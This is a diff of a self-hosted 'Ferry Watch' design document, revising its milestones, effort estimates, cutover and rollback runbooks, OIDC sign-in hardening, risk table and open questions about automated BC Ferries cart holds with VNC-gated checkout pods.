-| **S-DRAIN** | M1 | `talosctl reboot --drain` (or a TalosUpgrade) on one node in a quiet window, with one Watching pod and one Holding pod on a far-out sailing. | Watching pod moved; the hold released in order with an alert; the reboot proceeds. | Fix the agent drain before M1 exit. |
-| **S-IOS** (owner's iPhone) | M1 | In the home-screen app: a first sign-in; a re-sign-in after the app session expires (shortened in a test config) while the Authelia session lives; a notification tap with the app session expired. Do the redirect to Authelia and the way back stay inside the home-screen app, with its sessionStorage and localStorage? | Sign-in completes inside the app in every case and lands on the saved path. | Build the handoff-code fallback (§6.2.4; about 1 extra day); R18. |
+| **S-DRAIN** | M1 | `talosctl reboot --drain` (or a TalosUpgrade) on one node in a quiet window, with one Watching pod and one Holding pod on a far-out sailing with space (a brief real hold, released by the drain; no booking). | Watching pod moved; the hold released in order with an alert; the reboot proceeds. | Fix the agent drain before M1 exit. |
+| **S-IOS** (owner's iPhone) | M1 | In the home-screen app: a first sign-in including second-factor enrolment from Authelia's emailed code; a re-sign-in after the app session expires (shortened in a test config) and a re-verification while the Authelia session lives; a notification tap with the app session expired. In the first sign-in and one re-sign-in, background the app for 1-3 min during the Authelia password and second-factor steps (switching to Mail, an authenticator or a passkey prompt), then return. Do the redirect to Authelia and the way back stay inside the home-screen app, with its sessionStorage and localStorage, and does the app survive the switch? | Sign-in completes inside the app in every case and lands on the saved path. | The fallbacks in §6.2.4 for whichever case fails: the 10-minute localStorage pending sign-in, first enrolment in Safari or on a computer, or the handoff code (about 1 extra day); R18. |
 | **S-PUSH** | M2 | Web Push on an iOS 16.4+ home-screen app and on Android; notification click → `/c/<trip>`, including with the app session expired (re-sign-in returns to `/c`). SES: Authelia's one-time code reaches an invitee address. | All as stated. | Email-first onboarding; SES identity per invitee. |
-| **S-3DS** | M3 | Household cards from at least 3 issuers and the 3 networks: the household's real checkouts during M2 with Hubble DNS visibility on the pod, topped up for any missing issuer by walking checkout to the 3DS step and stopping there (no booking made only to test, owner round 2). | ACS hosts recorded; Q8 decided. | Non-household invitees wait, or Q8 option (b). |
+| **S-3DS** | M3 | Household cards from at least 3 issuers and the 3 networks: the household's real checkouts during M2 with Hubble DNS visibility on the pod. Topping up a missing issuer by walking a checkout to the 3DS step and stopping there (a brief real hold; the card is entered and the bank may prompt; no booking) happens only if the owner agrees under Q8. | ACS hosts recorded; Q8 decided. | Non-household invitees wait, or Q8 option (b). |
 | **S-VNCID** | M4 | §12.2 M4. | — | Q1 stands. |
-| **S-SBX** (one node; *optional, backlog*) | only if the owner chooses the hardening (M4) | Apply the Talos `user.max_user_namespaces` change and a `machine.seccompProfiles` Localhost profile (containerd default plus `clone`/`unshare` with namespace flags and `chroot`). Run `chromium_sandbox=True` in a PSA-restricted pod under that profile; separately, `hostUsers: false`. | `chrome://sandbox` shows the namespace sandbox and seccomp-BPF; the exact syscall additions are recorded. | `--no-sandbox` stays (R2). Not a gate. |
+| **S-SBX** (one node; *optional, backlog*, about 1 day) | only if the owner chooses the hardening (M4, Q12) | Apply the Talos `user.max_user_namespaces` change and a `machine.seccompProfiles` Localhost profile (containerd default plus `clone`/`unshare` with namespace flags and `chroot`). Run `chromium_sandbox=True` in a PSA-restricted pod under that profile; separately, `hostUsers: false`. | `chrome://sandbox` shows the namespace sandbox and seccomp-BPF; the exact syscall additions are recorded. | `--no-sandbox` stays (R2). Not a gate. |
 | **S-IDP** | at an IdP change | The new issuer (or a broker such as Dex, Pocket ID or authentik) as an `OidcProvider` entry: redirect URI, claim names, invite-match claim, and alias proposals for existing users (§6.2.6). | Works with the new IdP. | Keep the current issuer. |
 
 **Removed in round 2:** S1, S2, S2b, S5, S6, S7 and the live part of S-FIX (guest checkout assumed; replaced by
@@ -2321,13 +2522,14 @@ fixture capture and production detection, §5.7); S3 and S4 (they belonged to th
 
 ### 12.2 Milestones (each one shippable)
 
-**W0: De-risk (about 1.5 weeks).** The W0 spikes above (S-KIOSK, S-VNC-lite, S-CIL, S-OIDC, S-TR, S-MEM,
-S-DB: all local or on the cluster, none touching BC Ferries inventory), plus three small PRs: Cilium
+**W0: De-risk (about 1.5 weeks).** The W0 spikes above (S-KIOSK, S-VNC-lite, S-CIL, S-OIDC, S-TR, S-MEM's
+watching part, S-DB: all local or on the cluster, none holding a cart), plus three small PRs: Cilium
 `nameError` (home-cluster); the frontend `.catch('unknown')`; an opening-visibility metric on the current
 deployment (background data for the interval default, not a gate). Exit: every W0 spike has a pass or a
-chosen fallback. The old Q0-Q4 were answered in round 2 (§14.1); Q8 and Q9 are needed before M3.
+chosen fallback. No owner answer is needed for W0 (§14.1 lists what round 2 settled): Q1 is needed by the end
+of M2, and Q8-Q10 and Q12 before M3.
 
-**M1: The owner on the new stack (about 12.5-15 weeks).**
+**M1: The owner on the new stack (about 12.5-15.5 weeks).**
 - Deliverables:
   - **Code split:** uv workspace, `urls.py` out of `site.py`, import-linter.
   - **Agent and pod runtime:** OneTripStore, HoldPolicy with the payment guard, compiled maxima, guest
@@ -2335,15 +2537,17 @@ chosen fallback. The old Q0-Q4 were answered in round 2 (§14.1); Q8 and Q9 are 
     booking detection, the lost-after-viewer rule, exit after a viewed hold, typed alerts and events, the new
     error classes; the login code kept behind its disabled flag; the supervisor (Xvnc on a unix socket,
     `tini --`, SIGTERM drain, termination message), kiosk policies and self-tests; the gate.
-  - **Guest-checkout production detection** (§5.7): `checkout_login_seen`, expired-cart detection, "Did you
-    book it?" reasons, the outcome, release and duration metrics, the `guest_checkout_failing` alert,
-    `alertOnlyFareTypes`/`alertOnlyVehicleTypes`, and `checkout_mode` in the schema and the protocol.
+  - **Guest-checkout production detection** (§5.7): `checkout_login_seen` with `forced`, expired-cart
+    detection, "Did you book it?" reasons, the outcome, release and duration metrics, the hold-outcome
+    record, the `guest_checkout_failing` alert, `alertOnlyFareTypes`/`alertOnlyVehicleTypes`, and
+    `checkout_mode` in the schema and the protocol; the kept login path's tests ported (§11.4).
   - **Fixture capture** during the owner's real use (§12.1), with the classifiers, booking detection and the
-    full empty-cart check following as pages arrive.
+    full empty-cart check following as pages arrive; S-MEM's checkout measurement from the same holds.
   - **ferry-control:** hub endpoint (binding, protocol, `trip_state`, commands, budget, brake) and fleet loop
     (reconcile, queue, timers, reaper, cordon handling, adoption, failed-pod retention, smoke pod).
-  - **ferry-web:** OIDC sign-in (`OidcProvider`, sessions, bearer and WebSocket auth, invitations and the
-    bootstrap admin), user-scoped repository and API, per-user hub, ticket minting, `/c/<trip>` chooser,
+  - **ferry-web:** OIDC sign-in (`OidcProvider`, sessions with 24 h IdP re-verification, bearer and
+    WebSocket auth with session-bound sockets, invitations, unmatched identities and the bootstrap admin),
+    user-scoped repository and API, per-user hub, ticket minting, `/c/<trip>` chooser,
     outbox with email, the frontend (§10 items 1-5, 7-9); S-IOS on the owner's iPhone, and the handoff-code
     fallback if it fails.
   - **vnc-edge** (stock client, shim, landing page, CSP).
@@ -2355,16 +2559,17 @@ chosen fallback. The old Q0-Q4 were answered in round 2 (§14.1); Q8 and Q9 are 
     ExternalSecrets, CNPG managed roles, the Authelia OIDC client and its authorization policy (with the
     1Password `authelia` fields and Authelia's ExternalSecret entries), the smtp-relay rule, silences, the
     Fluent Bit and descheduler exclusions, the Cloudflare rule, the GrafanaDashboard.
-  - **Cutover** (§12.5), with the legacy app scaled to zero, not deleted.
+  - **Cutover** (§12.5), with the legacy app scaled to zero and kept, with its PVC and the BC Ferries
+    fields, until a real guest checkout has worked on the new stack.
 - Exit criteria:
   - The compose tier passes restarts of web and control during holds and a drain during a hold, against
     fake-bcferries, with 0 carts lost and every cart alert delivered once.
   - The post-deploy smoke is green on the home cluster; S-DRAIN done; S-IOS passed, or the fallback shipped.
   - At least 1 real hold opened through VNC on the owner's iPhone (from the owner's own trips, or a far-out
-    sailing with space that is released without booking), with one ferry-control restart during that hold.
-    No booking is made only to test (owner, round 2); the owner's first real guest checkout on the new
-    stack, whenever it comes, is the end-to-end proof and supplies the remaining fixtures, with the
-    alert-only switch ready (§5.7).
+    sailing with space: a brief real hold, released without booking), with one ferry-control restart during
+    that hold. No booking is made only to test (owner, round 2); the owner's first real guest checkout on the
+    new stack, whenever it comes, is the end-to-end proof and supplies the remaining fixtures, with the
+    alert-only switch ready and the legacy app still restorable (§5.7, §12.5).
   - The owner runs only the new stack for 7 days.
 
 **M2: Household invitees (about 3-3.5 weeks; the owner's soak overlaps).**
@@ -2377,24 +2582,26 @@ chosen fallback. The old Q0-Q4 were answered in round 2 (§14.1); Q8 and Q9 are 
 - Exit criteria: the cross-tenant suite is green (API 404s, WS payloads, VNC IDOR, Origin, replay, lock, second
   viewer, after release, another user's session token refused after revocation); the quota race test passes;
   up to 3 household invitees for 14 days with no Pending pods and admin time under 10 min/day; Q1 answered.
-  The legacy app is deleted 14 days after cutover (§12.5 step 8).
+  The legacy app is deleted only when §12.5 step 8's conditions hold (at least 14 days and a real guest
+  checkout on the new stack), not on a fixed date.
 
 **M3: Wider invitees (about 1.5-2 weeks; the household period overlaps).**
 - Deliverables: S-3DS and the resulting allowlist (Q8); the `fw-browser-pod-lock` and `fw-ns-objects` VAPs
   with kind-lite positives and the live `can-i` matrix; `home-cluster-runner` restricted; SES production
   access; Q9 applied if chosen.
-- Exit criteria: every item in §12.4 is green; 3-5 non-household invitees for 14 days.
+- Exit criteria: every item in §12.4 is green; Q12 decided; 3-5 non-household invitees for 14 days.
 - Why M3 stays its own milestone rather than merging into M2: it lost the sandbox work (about 3 days) but
   still marks an audience step. S-3DS needs the household's cards and real checkouts, which exist only once
   M2 runs, and the runner restriction and SES production access matter for strangers, not for the household.
   Merging would hold household invitees back for work they don't need. The optional sandbox hardening is not
-  part of M3; the owner may add it from M4 before inviting people they don't know well.
+  part of M3 unless the owner makes it a gate under Q12; otherwise the owner may add it from M4 before
+  inviting people they don't know well.
 
 **M4: Hardening backlog** (each item ships alone, ordered by observed need):
-- **Optional sandbox and kernel hardening** (the owner's call; recommended before inviting people the owner
-  doesn't know well; R2): S-SBX on one node, then the Talos sysctl and Localhost seccomp profile applied per
-  node, VAP params `sandbox`, `seccompProfile` and `requireUserNamespace`, `hostUsers: false` (about 3 days);
-  and a decision on `mitigations=off`.
+- **Optional sandbox and kernel hardening** (the owner's call, Q12; recommended before inviting people the
+  owner doesn't know well; R2): S-SBX on one node (about 1 day), then the Talos sysctl and Localhost seccomp
+  profile applied per node, VAP params `sandbox`, `seccompProfile` and `requireUserNamespace`,
+  `hostUsers: false` (about 3 days): about 4 days in all; and a decision on `mitigations=off`.
 - Device handoff ("continue on another device" QR code).
 - S-VNCID: an EG OIDC SecurityPolicy on the VNC route with the token carried correctly — remove only Cookie,
   have Envoy set a dedicated header (for example `X-FW-IdP-Token`) after deleting any client copy, let nginx
@@ -2404,6 +2611,8 @@ chosen fallback. The old Q0-Q4 were answered in round 2 (§14.1); Q8 and Q9 are 
 - Breaker canaries; weighted water-filling with AIMD leases and a fleet simulator; a Standby tier; a
   near-sailing priority.
 - TLS or Cilium WireGuard on :8766 (R10); a per-pod rate-limiting egress proxy (R13).
+- A shorter IdP re-verification period, or device-bound session tokens (a DPoP-style proof from a
+  non-extractable WebCrypto key), if R17 needs a smaller window.
 - cosign signatures, SBOMs and admission-time verification.
 - Admin Trips, Settings and Audit pages and a DB policy table; the request-access queue (with a social IdP);
   the `identityAliases` CLI.
@@ -2413,8 +2622,9 @@ chosen fallback. The old Q0-Q4 were answered in round 2 (§14.1); Q8 and Q9 are 
 - The protocol skew CI job (from the first protocol change); arm64 if ever needed.
 
 **M5 is removed** (owner, round 2: no pre-cart sign-in window, old Q1). Attended sign-in is listed as a
-possible future option in §15; the kept login code, `checkout_mode` and the VAP's `optionalEnv` keep it
-possible without a redesign.
+possible future option in §15. The kept login code, `checkout_mode`, the VAP's `optionalEnv`, the ticket's
+`aud` and C22's checkout scope mean adding it later undoes nothing, but it is still real work (about 1.5
+weeks, the old M5 estimate; the list is in §15) and needs the owner's explicit decision.
 
 ### 12.3 Effort and calendar (one developer, focused days)
 
@@ -2426,7 +2636,7 @@ possible without a redesign.
 | | **W0 total** | **6.5-8** |
 | M1 | Workspace split, `urls.py`, import-linter | 2 |
 | | One-trip agent | 9-11 |
-| | Guest-checkout production detection, `checkout_mode`, alert-only by fare and vehicle type | 1-1.5 |
+| | Guest-checkout production detection (forced or voluntary login, hold-outcome record), `checkout_mode`, alert-only by fare and vehicle type, porting the kept login path's tests | 1.5-2 |
 | | Fixture capture from the owner's real use; classifiers and the full empty-cart check | 1-1.5 |
 | | Supervisor, Xvnc unix socket, kiosk policies, self-tests, SIGTERM drain | 4-5 |
 | | Gate | 3-4 |
@@ -2436,12 +2646,12 @@ possible without a redesign.
 | | ferry-control fleet loop | 5-6 |
 | | Postgres schema, migrations, roles, RLS, trigger, import CLI | 3 |
 | | ferry-web (scoped API, per-user hub, tickets, `/c`, outbox and email) | 4-5 |
-| | OIDC sign-in (RP client and verification, sessions, bearer and WebSocket auth, invitations, SPA sign-in and callback, fake issuer, S-IOS) | 4-5 |
+| | OIDC sign-in (RP client and verification with an `alg` allowlist, sessions with 24 h re-verification, bearer and session-bound WebSocket auth, per-client pre-auth limits, invitations, unmatched identities, SPA sign-in and callback, fake issuer, S-IOS) | 4.5-5.5 |
 | | Frontend (§10 items 1-5, 7-9) | 5-6 |
 | | Chart, VAP, envtest matrix, `can-i`, helm-unittest, network policies | 5-6 |
 | | CI compose and kind-lite jobs | 2-3 |
 | | home-cluster PR, deploy, post-deploy smoke, S-DRAIN, cutover | 4-5 |
-| | **M1 total** | **62-76** |
+| | **M1 total** | **63-77** |
 | M2 | Web Push, service worker, onboarding, S-PUSH | 3-4 |
 | | Admin Fleet and Users, Add person, limits with provenance, suspend, delete | 4-5 |
 | | Delete-my-data, retention jobs | 1-1.5 |
@@ -2455,14 +2665,17 @@ possible without a redesign.
 | | Runner hardening, SES, Q9 if chosen | 1.5-3 |
 | | Soak fixes | 1-1.5 |
 | | **M3 total** | **6.5-10** |
-| | **Total to non-household invitees** | **89-112 days ≈ 18-22.5 weeks** |
+| | **Total to non-household invitees** | **90-113 days ≈ 18-22.5 weeks** |
 
 - What round 2 changed: W0 lost the live spikes (3-4 days) and S-SBX (about 1 day); M1 gained OIDC (the
-  header adapter's 1 day became 4-5, so +3-4) plus production detection and fixture capture (+2-3); M3 lost
-  the sandbox (3 days); M5 (about 1.5 weeks, never in the total) is gone. The previous total was 91-113
-  days. If S-IOS fails, the handoff-code fallback adds about 1 day to M1. The optional sandbox hardening
-  (about 3 days, M4) is outside the total.
-- The owner is on the new stack after W0 + M1: 68.5-84 days, about 14-17 focused weeks.
+  header adapter's 1 day became 4-5, so +3-4) plus production detection and fixture capture (+2-3), and then
+  about 1 day for the fixes from the independent review of that revision (24 h IdP re-verification,
+  session-bound sockets, per-client pre-auth limits, unmatched identities, the forced/voluntary login split
+  and hold-outcome record, the kept login path's tests); M3 lost the sandbox (3 days); M5 (about 1.5 weeks,
+  never in the total) is gone. The previous total was 91-113 days. If S-IOS fails, its fallbacks add about 1
+  day to M1. The optional sandbox hardening (about 4 days: S-SBX about 1 plus about 3, M4) is outside the
+  total.
+- The owner is on the new stack after W0 + M1: 69.5-85 days, about 14-17 focused weeks.
 - Calendar time adds the owner's 7-day soak (overlapping M2 work), the 14-day household period (overlapping M3
   work, which is now a little shorter than the period) and the 14-day non-household period: about 21-26
   calendar weeks to the end of M3.
@@ -2486,7 +2699,8 @@ possible without a redesign.
   termination message.
 - The in-pod gate: Ed25519 ticket bound to owner, trip, pod and cart_id; 60 s; single use; nonce lock with an
   atomic check-and-set; single viewer; Origin check; ping liveness; revocation at hold end. Hold caps
-  enforced by the agent, by web refusing to mint, by the operator's clock and by `activeDeadlineSeconds`.
+  enforced in all five places of C17: the agent, web refusing to mint, the operator's clock, Xvnc
+  `-MaxConnectionTime` and `activeDeadlineSeconds`.
 - Xvnc on a unix socket only, with fail-closed listener and lockdown self-tests; kiosk mode with managed
   policies. (The Chromium sandbox is optional hardening, not part of this line; R2.)
 - Static vnc-edge with the stock client and build-computed CSP; pods never serve HTML; every Cookie header
@@ -2494,14 +2708,16 @@ possible without a redesign.
 - Egress CNP (`toFQDNs` or the `toCIDRSet` fallback) plus default deny, verified by the post-deploy smoke;
   `nameError` set; the S-3DS allowlist and the blocked-host detector.
 - The browser namespace without `components/common`, excluded from Fluent Bit and the descheduler.
-- Identity: app-native OIDC with `id_token` verification and the cookie-less bearer session (C29), with the
-  code and token kept out of URLs (C15); the app's invitations; Authelia `authorization_policies` on the
-  `ferry-watch` client and on every other client; each invitee's email deliverable.
+- Identity: app-native OIDC with `id_token` verification (`alg` allowlist) and the cookie-less bearer
+  session re-verified with the IdP every 24 h, with sockets bound to their session (C29), the code and token
+  kept out of URLs (C15), and per-client pre-auth limits; the app's invitations; Authelia
+  `authorization_policies` on the `ferry-watch` client and on every other client; each invitee's email
+  deliverable; the "Removing a person" runbook (§12.5).
 - The user-scoped repository returning 404 for foreign ids; the cross-tenant suite green.
 - Limits: `maxTrips`, `maxActiveBrowsers = 1`, holds/day, VNC minutes/day, interval floor; admin Users and
   Fleet pages.
 - Web Push plus email; the persisted brake with the 30 s agent floor.
-- `home-cluster-runner` restricted; SES production access; Q1 decided; tenants told about R1 and R4.
+- `home-cluster-runner` restricted; SES production access; Q1 and Q12 decided; tenants told about R1 and R4.
 
 Everything in M4 is post-v1. None of it is needed for the guarantees the owner asked for.
 
@@ -2509,7 +2725,9 @@ Everything in M4 is post-v1. None of it is needed for the guarantees the owner a
 
 **Cutover and rollback (M1).**
 1. Before: the new stack has run on `ferry-next.chestr.dev` with the owner as its only user, and the owner has
-   signed in there at least once (so their uid exists); a revert PR is prepared.
+   signed in there at least once (so their uid exists); a revert PR is prepared, pinning the legacy image by
+   digest (today it is tag-only, `ghcr.io/mchestr/ferry-watch` `0.5.1`,
+   `default/ferry-watch/app/helmrelease.yaml:20-22`).
 2. In the legacy dashboard, turn off "Watch all trips" (`PATCH /api/settings` `enabled=false`) and release any
    held carts.
 3. Copy `config.json` and `alerted.json` out of the legacy pod (`kubectl cp`, cluster admin).
@@ -2521,13 +2739,22 @@ Everything in M4 is post-v1. None of it is needed for the guarantees the owner a
    ferry.chestr.dev`. Never two routes for one host at once (UniFi DNS would conflict).
 6. Go/no-go within 30 min: post-deploy smoke green (including the echo check and an unauthenticated 401);
    the owner signs in on `ferry.chestr.dev`; imported trips Watching; a test alert arrives.
-7. Rollback, any time in the next 14 days: merge the revert PR (legacy replicas 1 and its route back; the new
-   route back to `ferry-next`), then set legacy `enabled=true`. The legacy PVC still holds its state.
-8. After 14 days: delete `kubernetes/apps/default/ferry-watch` (its PVC is pruned; VolSync snapshots stay in
-   R2 per their retention); remove only that app's reference to the `pushover` 1Password item (the item itself
-   serves kube-prometheus-stack, gatus, sonarr, radarr and qbittorrent); delete `BCF_USER` and `BCF_PASS` from
-   the 1Password item `ferry-watch`; remove the `ferry-next.chestr.dev` redirect URI from the Authelia
-   client.
+7. Rollback, any time until step 8: merge the revert PR (legacy replicas 1 and its route back; the new
+   route back to `ferry-next`), then set legacy `enabled=true`. The legacy PVC still holds its state. If guest
+   checkout fails and the owner wants logged-in checkout back while the new stack keeps serving invitees,
+   the legacy app can instead run next to it on an envoy-internal host (for example
+   `ferry-legacy.chestr.dev`, LAN and WireGuard only), never on `ferry.chestr.dev`; it then shares the home
+   IP's check budget.
+8. Only when **all** of these hold: at least 14 days since cutover; at least one real guest checkout
+   completed on the new stack (outcome `booked`, or a "Yes" to "Did you book it?"); and no forced login wall
+   and no `guest_checkout_failing` alert since. Then: delete `kubernetes/apps/default/ferry-watch` (its PVC is
+   pruned; VolSync snapshots stay in R2 for their 7 daily copies,
+   `components/volsync/r2/replicationsource.yaml:23-24`); remove only that app's reference to the
+   `pushover` 1Password item (the item itself serves kube-prometheus-stack, gatus, sonarr, radarr and
+   qbittorrent); delete `BCF_USER` and `BCF_PASS` from the 1Password item `ferry-watch`; remove the
+   `ferry-next.chestr.dev` redirect URI from the Authelia client (it may go earlier). Until then the legacy
+   HelmRelease stays at `replicas: 0` with its route off, its 1 Gi PVC kept and the two BC Ferries fields
+   kept: the owner's only logged-in checkout path, and the cheap half of the "adjust later" door.
 
 **Inviting a person (M2+).**
 1. Make sure their email is deliverable: SES production access, or add the address as a verified SES identity
@@ -2547,10 +2774,24 @@ Everything in M4 is post-v1. None of it is needed for the guarantees the owner a
      during Sleep/Focus;
    - send yourself a test alert;
    - you must be in Canada or the US to sign in or check out (Q11);
-   - check out as a guest: signing in to BC Ferries during checkout can empty the held cart;
+   - your first sign-in (with the emailed code) is easiest in Safari or on a computer; afterwards the
+     home-screen app needs only your password;
+   - check out as a guest, and don't sign in to your BC Ferries account during checkout: BC Ferries doesn't
+     accept a sign-in while a cart is held, and your password would pass through the same unencrypted path
+     as your card;
    - what we can see: the cluster admin can technically see everything; checkout keystrokes pass through
      Cloudflare and our servers unencrypted for a moment; your card is never stored; checkout is as a guest.
 5. Check the Users page shows the person as active (invitation used) with push enabled.
+
+**Removing a person.** Authelia re-checks the group only when the person's session next goes back to it
+(within 24 h, R20), so the app comes first:
+1. On the Users page: **suspend** (with a reason). This revokes every session, closes their sockets and
+   drains their pods at once (a held cart is released, or allowed to finish, by choice).
+2. In the lldap UI: remove them from group `ferry-watch` (or disable or delete the user).
+3. If they won't come back: **delete user** in Ferry Watch (user, `identities` row, push subscriptions,
+   trips) *before* deleting or renaming them in lldap, and never give their username to someone else
+   (R21). The same applies to resetting a compromised account: suspend first, reset in lldap, then
+   reactivate.
 
 **Talos upgrade.** §7.8: turn on "Pause carting", wait until the Holds panel is empty (at most the hard cap),
 merge the Renovate PR, turn carting back on when tuppr reports the upgrade complete.
@@ -2571,7 +2812,7 @@ exec into or screenshot a pod that holds a cart.
 
 | Risk | Likelihood / impact | Mitigation |
 |---|---|---|
-| Guest checkout doesn't work, or not for some fare or vehicle types | Medium / high | Assumed to work, with no spike (owner, round 2). Production detection (login wall seen, "Did you book it?" reasons, outcome metrics, the `guest_checkout_failing` alert); the immediate fleet-wide alert-only switch and per-fare/vehicle alert-only; the login code, `checkout_mode` and the VAP's `optionalEnv` keep an account mode possible (§5.7). |
+| Guest checkout doesn't work, or not for some fare or vehicle types | Medium / high | Assumed to work, with no spike (owner, round 2). Production detection (forced login walls, "Did you book it?" reasons, outcome metrics and the per-hold outcome record, the `guest_checkout_failing` alert on the first forced wall); the immediate fleet-wide alert-only switch and per-fare/vehicle alert-only; the legacy app kept restorable until a guest checkout has worked (§12.5); the login code, `checkout_mode` and the VAP's `optionalEnv` keep an account mode possible (§5.7). |
 | A BC Ferries or Queue-it block of the home IP (household too) | Medium / high | 20/min budget, start throttle, persisted brake (pause on any 403/429/challenge), breaker, fail-slow agents, maintenance switch. A compromised pod can bypass these (R13). |
 | VAP or RBAC drifts from the template | Medium / critical | Template and VAP are written together; leak matrix, `can-i` and helm-unittest block CI; allowlist-style CEL; PSA as a second fence; second-fence VAPs from M3. |
 | Cilium `toFQDNs` or the DNS proxy misbehave (never used here) | Medium / medium | `nameError` plus fully qualified names; S-CIL in W0 with both resolvers; `toCIDRSet` fallback; the post-deploy smoke after every deploy. |
@@ -2582,14 +2823,15 @@ exec into or screenshot a pod that holds a cart.
 | The stock KasmVNC client changes on upgrade | Low / medium | No bundle patch; a CI test drives the client through the shim against a fake gate. |
 | Memory is higher than measured (heavy pages, tmpfs, checkout) | Medium / medium | S-MEM measures the cgroup working set including tmpfs; podMemory starts at 1.5 GiB; disk cache capped; recycle at 85 % while Watching, alert while Holding; quota backstop. |
 | A Talos upgrade releases a hold (R8) | Medium / low | "Pause carting" runbook; orderly release with an alert; hold PDB plus `drainTimeout` in M4 if it bites. |
-| A session token stolen through XSS on the dashboard origin (R17) | Low / medium | The strict hash-based CSP; short idle and absolute expiry; server-side revocation (logout, "sign out everywhere", suspension); VNC still needs the pod's ticket and first-viewer lock. |
+| A session token stolen through XSS on the dashboard origin (R17) | Low / medium | The strict hash-based CSP (blocks injection and fetch/form exfiltration, not navigation); the 24 h IdP re-verification, which a thief can't pass; idle and absolute expiry; server-side revocation (logout, "sign out everywhere", suspension); VNC still needs the pod's ticket and first-viewer lock. |
+| Someone removed in lldap keeps app access (R20), or a reused username inherits an old account (R21) | Medium / medium | The "Removing a person" runbook suspends in the app first; 24 h re-verification bounds the rest; usernames are never reused, and a sign-in with a changed email is flagged. |
 | Sign-in from the iOS home-screen app lands outside the app (R18) | Unknown / medium | S-IOS on the owner's iPhone in M1; the handoff-code fallback (§6.2.4). |
 | The OIDC issuer is unreachable from ferry-web (egress rule, Authelia down) | Low / medium | S-OIDC proves the rule; existing sessions keep working (only new sign-ins need the issuer); SignInErrors alert. |
 | Invitees can't log in (2FA enrolment email, 1-day ban, geo-block) | Medium / medium | SES deliverability per invitee is a prerequisite; onboarding email; Q6 on the ban; Q11 on travel. |
 | iOS Web Push lapses, the app isn't installed, or Focus silences it | High / medium | Email for every cart alert; push health on the Account card; reminder at 15 min; quiet hours on by default; onboarding asks to allow Ferry Watch in Focus. |
 | PCI and ToS exposure (keystroke relay, automated carting for several people) | Unknown / medium | Disclose to tenants (naming Cloudflare). No payments taken. Short holds, per-user caps, no account automation. The UA question (Q4). |
 | A compromised web races a first VNC connection (R3) | Low / medium | First-viewer lock (visible, before card entry); Q1; S-VNCID in M4. |
-| A Chromium exploit in an unsandboxed browser, or a side channel on `mitigations=off` nodes (R2) | Low / high | Accepted for now (owner, round 2); contained to one session by per-pod isolation, no secrets, no token and the egress allowlist; the optional sandbox hardening (M4) is recommended before inviting people the owner doesn't know well. |
+| A Chromium exploit in an unsandboxed browser, or a side channel on `mitigations=off` nodes (R2) | Low / high for that tenant's checkout; critical if chained with a kernel bug (every node is a control-plane node) or a ferry-control parser bug | Per-pod isolation, no secrets, no token and the egress allowlist contain an exploit to one tenant's pod while the kernel and the parser hold. Recommended (pending the owner, Q12): accept for now, with the optional sandbox hardening (M4, about 4 days) before inviting people the owner doesn't know well. |
 | The self-hosted runner is reachable from fork PRs (R1) | Unknown / critical | Restricted before non-household invitees (M3 hard gate). |
 | The effort runs over | Medium / medium | Bottom-up estimate with ranges; explicit cut line (§12.4); M4 holds everything not needed for the owner's guarantees. |
 
@@ -2597,21 +2839,22 @@ exec into or screenshot a pod that holds a cart.
 
 ## 14. Open questions for the owner
 
-### 14.1 Answered in round 2 (old numbers)
+### 14.1 Settled in round 2 (old numbers)
 
-| Old | Question | Owner's answer | Where it lands |
+| Old | Question | Answer | Where it lands |
 |---|---|---|---|
-| Q0 | Identity | "Can we use oidc?": yes. App-native OIDC against Authelia with a cookie-less app session. | §6.2, C29, R17-R19 |
-| Q1 | Pre-cart sign-in window | No. VNC stays strictly gated to a held cart; attended sign-in is a possible, reversible future option. | §5.7, §15 |
+| Q0 | Identity | "Can we use oidc?": yes. App-native OIDC against Authelia with a cookie-less app session. | §6.2, C29, R17-R21 |
+| Q1 | Pre-cart sign-in window | Owner: no. VNC stays strictly gated to a held cart in v1; attended sign-in is a possible future option that needs the owner's explicit decision. | §5.7, §15 |
 | Q2 | Live booking spike (S2b) | No: "No spike for now, assume it works and if not we will adjust later, don't make any one way door decisions on this." | §5.7, §12.1 |
-| Q3, Q3b | Guest checkout; the owner's own checkouts as a guest | Accepted "for now". Users may sign in inside the browser, but the plan doesn't rely on it. | §5.7 |
-| Q4 | Sandbox and kernel | The owner asked why it was needed; explained in R2. Optional hardening, not a gate unless the owner later makes it one. | R2, §12.2 M4 |
-| Q6 | Lua or a separate domain | Moot: the app sets no cookie. | §6.2.1, R12 |
+| Q3, Q3b | Guest checkout; the owner's own checkouts as a guest | Owner: accepted "for now". Asked "Users can always sign-in on the browser?": probably not during checkout (BC Ferries has refused sign-ins while a guest cart exists), and advised against; not relied on. | §5.7 |
+| Q4 | Sandbox and kernel | The owner asked why it was needed; explained in R2. **Not yet decided:** the planner recommends optional hardening, not a gate; the owner's confirmation is Q12 below. | R2, Q12 |
+| Q6 | Lua or a separate domain | Planner: mostly moot, because the app sets no cookie, so the server never receives the Authelia cookie. A separate domain would still stop script served from the ferry host from making same-site requests that carry it (R12); not proposed for v1, and still possible later. | §6.2.1, R12 |
 
 ### 14.2 Still open
 
-Each has a recommended default. Q1, Q8 and Q9 change scope; the rest tune numbers or wording. Old numbers
-are in brackets, for readers of earlier versions and of Appendix D rows 1-35.
+Each has a recommended default. Q1, Q8, Q9 and Q12 change scope; the rest tune numbers or wording. Old
+numbers are in brackets, for readers of earlier versions and of Appendix D rows 1-35. None is needed for W0:
+Q1 by the end of M2, Q8-Q10 and Q12 before M3, the rest when the milestone that uses them starts.
 
 1. **Q1 [Q5] Residual R3.** Accept that a compromised ferry-web could win the race to a hold's *first* VNC
    connection (visible, before card entry; later takeover impossible)? **Default: accept for invite-only
@@ -2642,7 +2885,10 @@ are in brackets, for readers of earlier versions and of Appendix D rows 1-35.
 8. **Q8 [Q13] 3DS egress posture.** (a) A curated allowlist of payment and ACS hosts from the owner's
    checkouts and S-3DS, plus the blocked-host detector and "Release and book it myself"; or (b) a broader
    posture during holds (DNS `matchPattern: "*"` and public `toCIDRSet`), accepting that a tenant could then
-   browse anywhere from the home IP during their own holds (it weakens decision 9). **Default: (a).**
+   browse anywhere from the home IP during their own holds (it weakens decision 9). With (a), may S-3DS top
+   up a missing issuer by walking a household card to the 3DS step and stopping there (a brief real hold,
+   the card entered and possibly a bank prompt, no booking)? **Default: (a), with walks only if you agree;
+   otherwise only the household's real checkouts count.**
 9. **Q9 [Q14] Shared Postgres superuser (R14).** Keep the standard `components/cnpg` (superuser Secret
    resident in `ferry-watch`, used only by the stock `postgres-init`), or add a CNPG `Database` plus managed
